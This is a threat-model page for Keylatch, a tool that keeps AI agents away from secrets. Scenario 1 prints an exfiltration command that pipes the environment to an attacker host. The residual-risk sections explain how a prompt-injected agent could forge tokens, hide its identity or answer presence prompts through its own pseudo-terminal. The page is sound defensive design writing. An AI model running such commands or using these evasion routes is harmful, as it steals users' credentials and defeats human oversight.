---
title: Threat Model
description: What Keylatch protects against in each mode, what it does not, and the tests behind each claim.
---

# Threat Model

**In-user mode is not a boundary against an agent running as your own user.**
Everything Keylatch keeps on disk is readable by your account, so an agent with
a shell can read it or run a modified binary. In-user mode raises the cost and
removes the easy failures: no plaintext key, deny-by-default policy, a human at
a terminal for every privileged change, and an audit trail. It does not make a
same-user agent harmless. The boundary arrives with the broker daemon, which
holds every key under a separate OS user.

## The promise

An agent running in any harness can never read environment variables, API keys
or secret-manager contents. It can use secrets only through brokered actions
(`run`, `call`, the gateway, `mint`), under policy, with audit.

What that promise means depends on the mode:

| | In-user mode (this release) | Broker daemon (v0.11.0 on Linux, v0.12.0 on macOS and Windows) |
|---|---|---|
| Where the keys live | the OS keyring, or under a passphrase; never a plaintext file unless the operator's config allows it | a separate OS user; nothing readable by yours |
| Who may use a connection | the caller kind its policy names; no policy means no access | the same, decided by the daemon |
| Privileged changes | an interactive terminal no agent harness owns, plus the platform prompt where installed | a presence proof the daemon verifies itself |
| What an agent can still do | read same-user files, run a modified binary, drive a pseudo-terminal it created | reach only the connections whose policy allows `agent` (or `host` if it hides), within their ceilings, audited |

## Attackers

Each "handled" claim links to the test that backs it. The attacker scenario
table ([`tests/harness/scenarios.go`](../../tests/harness/scenarios.go)) runs fake
agents against the built binary: rows still open are marked `wantLeak`, and each
blocked row that a unit test holds in place names that test (`policy-allow-everything`,
`wildcard-gateway-token`, `agent-gateway-token-for-llm-route`,
`ui-no-open-url-capture`).

| Attacker | In-user mode (this release) | Broker daemon |
|---|---|---|
| Prompt-injected agent with a shell, any harness | **Not a boundary.** It is detected from positive signals, denied by default policy, and its shipped-CLI paths to privileged actions need presence; the hook blocks direct reads. A determined agent can still read same-user files or run a modified binary. | Handled: no key material is readable by its UID, and privileged actions need presence it cannot produce. |
| Malicious tool output (indirect injection) | As above. | As above; gateway response labels and redaction stay defense in depth. |
| Same-user process that is not an agent (malware, a compromised dependency) | **Not handled.** | Handled as for the agent; classified `host`. |
| Stolen laptop, powered off | Handled when the key is in the OS keyring or under a passphrase. | Handled; TPM-bound where available. |
| Compromised broker daemon | n/a | Not handled (trusted computing base); minimized by hardening and a small surface. |
| Root or administrator on the host | Not handled. | Not handled. |
| Malicious provider template | Handled: schema validation, a fail-closed SSRF allowlist, `allowed_command_prefixes`. | Same. |
| Remote web page against the UI | Handled: SameSite, CSRF, CSP, a one-time URL that only a terminal sees. | Same. |

## What in-user mode does stop

These are the easy failures it removes. None of them is a boundary against a
determined same-user process.

- **No plaintext key on disk.** Bootstrap puts the vault identity in the OS
  keyring or wraps the key under a passphrase typed on a terminal, and fails
  rather than writing a plaintext file. No flag and no environment variable can
  change that; only `allow_insecure_file_kek` in the operator's own config file
  can. Existing plaintext keys move with `keylatch keys rewrap`, which proves the
  new key before deleting the old one.
  Tests:
  [`TestBootstrapNeverWritesPlaintextKEK`](../../internal/bootstrap/kek_storage_test.go),
  [`TestBootstrap_EnvironmentCannotOptIntoPlaintext`](../../internal/bootstrap/kek_storage_test.go),
  [`TestPassphraseKEKRequiresTTY`](../../internal/cli/keys_cmd_test.go),
  [`TestRewrapRemovesIdentityFile`](../../internal/cli/keys_cmd_test.go),
  [`TestRewrapVerifiesBeforeDelete`](../../internal/cli/keys_cmd_test.go).
- **Deny by default, one decision point.** `run`, `call` and the gateway ask the
  same function; with no policy they deny. A caller kind a connection's policy
  does not name is denied, and a grant overrides a denial only if a human issued
  it with presence. See [policy](../policy.md).
  Tests:
  [`TestMissingPolicyDenies`](../../internal/policy/enforce/enforce_test.go),
  [`TestMissingPolicyDenies` (gateway)](../../internal/gateway/handler_policy_test.go),
  [`TestAgentAllowedOnlyUnderListedRuntimes`](../../internal/policy/enforce/enforce_test.go),
  [`TestCLIAndGatewayAgree`](../../internal/gateway/enforce_agree_test.go),
  [`TestGrantNeedsPresenceToOverride`](../../internal/policy/enforce/enforce_test.go),
  [`TestMatcherNoImplicitExtension`](../../internal/policy/match/match_test.go).
- **Caller kinds that environment variables cannot forge.** An agent that hides
  its signals is `host`, never `human` or `service`; `INVOCATION_ID` does not
  make a caller a service. A token minted for an agent keeps the gateway's agent
  route restrictions, and an edited token store cannot relax it.
  Tests:
  [`TestClassifyKinds`](../../internal/callerkind/callerkind_test.go),
  [`TestMintIgnoresInvocationIDVariable`](../../internal/cli/mint_cmd_test.go),
  [`TestRunTokenCarriesCallerKind`](../../internal/runner/enforce_dispatch_test.go),
  [`TestStoreEditCannotRelaxAnAgentToken`](../../internal/gateway/token/caller_kind_test.go).
- **Privileged commands need a human.** `backup`, `grant create` and `revoke`,
  `gateway token create` with any `--allow`, `config set` for policy, gateway,
  backend and guard keys, `ui` above the read scope, `policy` mutations, `keys
  rewrap` and `install-guard --uninstall` need an interactive terminal that no
  harness owns, plus polkit, Touch ID or the account password, or Windows Hello
  where available. No environment variable changes the outcome, and the backup
  passphrase is read from the terminal only.
  Tests:
  [`TestRequireNeedsTTY`, `TestRequireDeniedByPlatform`, `TestNoEnvOverride`](../../internal/presence/presence_test.go),
  [`TestTokenCreateNeedsPresence`, `TestUIAdminNeedsPresence`, `TestConfigSetPolicyKeyNeedsPresence`, `TestGuardUninstallNeedsPresence`](../../internal/cli/presence_wiring_test.go),
  [`TestBackupNeedsPresence`, `TestBackupPassphraseFileRemoved`](../../internal/cli/presence_wiring_test.go),
  [`TestPolicyMutationNeedsPresence`](../../internal/cli/policy_files_cmd_test.go).
- **The UI's one-time URL does not leak through captured output.** It goes to a
  terminal or the OS browser opener, never to a pipe.
  Test:
  [`TestUIURLNotPrintedWithoutTTY`](../../internal/cli/presence_wiring_test.go).
- **Env opt-outs are gone.** No environment variable relaxes a decision; raw
  credential exposure is refused without naming a way around it.
  Tests:
  [`TestRefusalHasNoBypassHint`, `TestNoEnvOptOutForUnverifiedSession`](../../internal/cli/presence_wiring_test.go).
- **Swapped or concurrently written secrets are caught.** Secret files carry the
  partition, path and version they were written for, and writers serialize across
  processes.
  Tests:
  [`TestAADPathMismatchRejected`, `TestFileBackendCrossProcessLock`](../../internal/backend/file/aad_lock_test.go).

## What it does not stop (residual risks, stated plainly)

- **Same-user reads.** The gateway signing key, the token store, the audit salt
  and the Bitwarden session sit in files your account can read, so an agent that
  reads them can forge gateway tokens, widen a stored token's use and recompute
  the audit chain. Moving them under keys the daemon holds is the broker
  daemon's job.
- **Unlocked keyrings.** A keyring item is readable by other processes running as
  you while the keyring is unlocked. It keeps the key off disk, out of backups and
  out of file copies; it is not a boundary.
- **A terminal the agent created.** Presence checks that no agent harness is an
  ancestor of the process and that stdin and stderr are terminals. An agent that
  opens a pseudo-terminal through a process tree that hides the harness can answer
  the prompt. The platform prompt (polkit, Touch ID, Windows Hello) closes that
  where it is installed and the agent cannot drive it; hosts without one rely on
  the terminal check alone.
- **A modified binary or a changed configuration.** An agent can run its own build
  of Keylatch or edit files that the CLI trusts. Policy files are checked for
  owner and mode, not signed, until the daemon signs policy.
- **Hidden agents are `host`, not blocked.** Policy should allow `host` only where
  an evasive agent at that policy's ceiling is acceptable. Service classification
  is advisory until the daemon enrolls units.
- **Backend credentials in the environment.** A backend session or token passed to
  a child process through its environment is visible to it.

## Scenario 1 — Exfiltration via tool call

An agent, or a prompt injected into its context, runs `keylatch get openrouter
api_key`, `env | curl https://attacker.com`, or reads `~/.keylatch/`.

Keylatch:
- refuses `keylatch get` and value-bearing verbs for agent and host callers, and
  refuses raw credential exposure whatever the detection says;
- gives agents brokered actions only: the gateway holds the provider key and sends
  it to the provider endpoint, and `run` injects it into a child process and
  redacts it from the output;
- blocks the direct commands with the agent-guard hook (`contrib/agent-guards/`),
  which is one layer of several, not the boundary.

Gap: detection reads signals the agent controls, so it can only tighten decisions,
never relax them. An agent with a shell can read files your account can read; see
the residual risks above.

## Scenario 2 — Shell history leak

A credential supplied as a CLI argument, a command substitution or a shell-profile
export lands in `~/.bash_history`, `ps` output or session logs.

Keylatch never accepts a credential value as a positional argument: `connect`
prompts on stdin or reads a `--provider-ref`; stored credentials are encrypted at
rest; the audit log records that a credential was used, never its value.

Gap: a value exported or pasted into the shell before `keylatch connect` is in
the history. Use the interactive prompt or `--provider-ref`.

## Scenario 3 — Malicious provider template

A community template carries a malicious `injection_rules` entry, an overridden
`allowed_command_prefixes` or a crafted `storage_path_tpl`.

Templates are validated against a strict JSON Schema on load and unknown fields are
rejected; `storage_path_tpl` is confined to the `~/.keylatch/` namespace;
`allowed_command_prefixes` is enforced for every `run`; community templates load
only from the local provider directory (`keylatch registry reload`) and CI validates
every embedded template.

Gap: user-installed community templates are not signed, so a well-formed but
semantically malicious template is accepted.

## The Linux broker

With the system broker installed (see the [broker guide](../guides/broker-linux.md)),
the keys, the secret store, the policy and the audit log belong to the `keylatch`
OS user, and clients reach them over `/run/keylatch/broker.sock`. In-user mode
stays available and is described above; `keylatch doctor` reports which mode is
active and warns while a Linux machine runs in-user mode. The claims below are
about the broker only, and each links to the test that holds it.

| Claim | Tests |
|---|---|
| Each user's secrets live in their own partition, and a record moved to another user, path or version does not open. | [`TestPeerUIDPartitioning`](../../internal/brokerd/server_test.go), [`TestStoreAADChecked`](../../internal/backend/brokerstore/store_test.go) |
| Keys are never written unwrapped, sit in locked memory, and a master key rotation rewraps every key without re-encrypting a value. | [`TestHierarchyDerivations`](../../internal/brokerd/keys/keys_test.go), [`TestKeysMlocked`](../../internal/brokerd/keys/keys_test.go), [`TestBMKRotationRewraps`](../../internal/brokerd/keys/keys_test.go), [`TestRewrapKeepsCiphertext`](../../internal/backend/brokerstore/store_test.go) |
| A request from a process that is no longer the one that connected (a recycled PID) is refused; the peer's control group is read from the kernel. | [`TestPidReuseRejected`](../../internal/brokerd/peer_linux_test.go), [`TestCgroupResolved`](../../internal/brokerd/identity_test.go) |
| A privileged request without a presence proof is refused even from a client that skips the prompt; a proof is single use, bound to the request digest and the user, and expires. An agent session cannot ask. | [`TestPrivilegedRefusedWithoutProof`](../../internal/brokerd/presence_test.go), [`TestProofReplayRefused`](../../internal/brokerd/presence_test.go), [`TestProofBoundToDigest`](../../internal/brokerd/presence_test.go), [`TestPolkitSubjectIsPeer`](../../internal/brokerd/presence_test.go) |
| Policy the daemon accepted is signed with its own key; a stored policy that is edited, added to or unsigned is ignored, the daemon denies and records `security.block`; importing a bundle from another host needs presence. | [`TestPolicySignedOnAccept`](../../internal/brokerd/policy_test.go), [`TestTamperedPolicyIgnored`](../../internal/brokerd/policy_test.go), [`TestImportNeedsPresence`](../../internal/brokerd/policy_test.go) |
| Processes of a launcher-registered agent scope are `agent` without any environment signal; a process that leaves the scope is `host`, never `human` or `service`. | [`TestLaunchedAgentClassified`](../../internal/brokerd/sessions_test.go), [`TestEscapedProcessIsHostNotHuman`](../../internal/brokerd/sessions_test.go) |
| Adopting an in-user install moves every secret and checks a keyed hash of each before revoking tokens and shredding key material; a mismatch leaves the in-user install untouched; export restores it. | [`TestBrokerInstallAndAdopt`](../../internal/brokerd/adopt_test.go), [`TestAdoptVerifiesKeyedHashes`](../../internal/brokerd/adopt_test.go), [`TestExportToUserRoundTrip`](../../internal/brokerd/adopt_test.go) |
| The service runs with a strict filesystem view, no capabilities, a system call filter and a score under 2.0 in `systemd-analyze security`; the socket is activated by systemd. | [`TestBrokerServiceIsHardened`](../../packaging/linux/units_test.go), [`TestBrokerdSystemdHardening`](../../tests/integration/broker_hardening_test.go) |
| The wire protocol decodes strictly and survives arbitrary input. | [`FuzzBrokerRequest`](../../internal/brokerapi/fuzz_test.go), [`FuzzControlFrame`](../../internal/control/fuzz_test.go), [`FuzzPeerIdentity`](../../internal/brokerd/identity_test.go) |

Values reach a command only through brokered tiers: the gateway the daemon hosts
for each user (the provider key is added by the daemon, never handed to the child)
and the placeholder proxy. No client verb returns a stored value to a caller the
daemon classifies as `agent` or `host`, and with no presence proof the daemon
classifies nobody as `human`.

Residual risks of the broker:

- **The daemon is the trusted computing base.** A compromised `keylatchd`, or root
  on the host, defeats it. It is minimized by the unit's hardening, locked memory,
  a non-dumpable process, one small socket protocol and fuzzing.
- **Presence is as strong as the polkit agent.** The prompt asks for the user's own
  password every time (`auth_self`, never retained), shown by the desktop session
  for the process that asked. A host without polkit refuses privileged requests.
- **An agent that hides is `host`.** It reaches only connections whose policy
  allows `host`, within their ceilings. Allow `host` only where that is acceptable.
- **Upstream keys that lived in your account before adoption** could have been
  read by a process of that account. Doctor lists them with "rotate recommended".
- **A device root without a TPM** is protected by the host key alone; doctor warns.

## What Keylatch does NOT defend against

| Threat | Why |
|--------|-----|
| **Compromised local OS (root access)** | Root can read any file, inspect process memory or replace the binaries. |
| **A same-user agent that is determined** | See the residual risks. In-user mode is defense in depth, not a boundary. |
| **Malicious daemon or CLI replacement** | If the binary is replaced before you verify it, verification cannot help. Verify after a fresh install. |
| **Supply-chain compromise before verification** | Cosign gives post-download assurance. Install from the official release and verify immediately. |
| **Memory scraping** | A process with `ptrace` access can read credential values in memory. Keylatch zeroes buffers after use but cannot stop every form of inspection. |
| **Keychain or system secret store vulnerabilities** | Keylatch relies on the operating system's credential storage. |
| **Network-layer exfiltration** | Keylatch does not block outbound connections made by a subprocess; an allowed command that exfiltrates over the network is not detected. |
| **A user who approves everything** | Presence and approvals can be requested, not made wise. |

## Security model summary

Keylatch enforces five runtime invariants (see `keylatch security`):

- Agents use secrets only through brokered actions, with the protection stated per mode above
- Every secret use is logged
- Revoking access is instant
- Approvals expire automatically
- The raw credential is sent only to the allowlisted provider endpoint

For the invariant cross-reference table, see [`docs/security/invariants.md`](invariants.md).
For release verification, see [`docs/verifying-releases.md`](../verifying-releases.md).
